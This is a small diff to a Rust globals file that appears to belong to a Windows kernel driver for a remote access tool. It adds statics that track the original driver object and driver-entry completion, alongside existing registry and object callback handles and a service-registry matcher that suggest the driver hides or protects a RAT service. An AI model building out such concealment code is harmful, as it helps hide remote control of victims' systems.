@@ -1,10 +1,11 @@
 use core::ffi::c_void;
 use core::ptr;
-use core::sync::atomic::{AtomicI64, AtomicPtr};
+use core::sync::atomic::{AtomicBool, AtomicI64, AtomicPtr};
 
 use aho_corasick::AhoCorasick;
 use const_format::formatcp;
 use rat_common::global::RAT_CLIENT_SERVICE_NAME;
+use wdk_sys::DRIVER_OBJECT;
 use widestring::{U16CStr, u16cstr};
 
 pub const MAX_INITIALIZE_ATTEMPTS: usize = 50;
@@ -41,4 +42,6 @@ pub static OB_REGISTER_CALLBACKS_HANDLE: AtomicPtr<c_void> = AtomicPtr::new(ptr:
 pub static SERVICE_REGISTRY_AHO_CORASICK: AtomicPtr<AhoCorasick> = AtomicPtr::new(ptr::null_mut());
 pub static CM_REGISTER_CALLBACK_COOKIE: AtomicI64 = AtomicI64::new(0);
 
+pub static ORIGINAL_DRIVER_OBJECT: AtomicPtr<DRIVER_OBJECT> = AtomicPtr::new(ptr::null_mut());
 pub static ORIGINAL_DRIVER_UNLOAD: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());
+pub static ORIGINAL_DRIVER_ENTRY_COMPLETED: AtomicBool = AtomicBool::new(false);
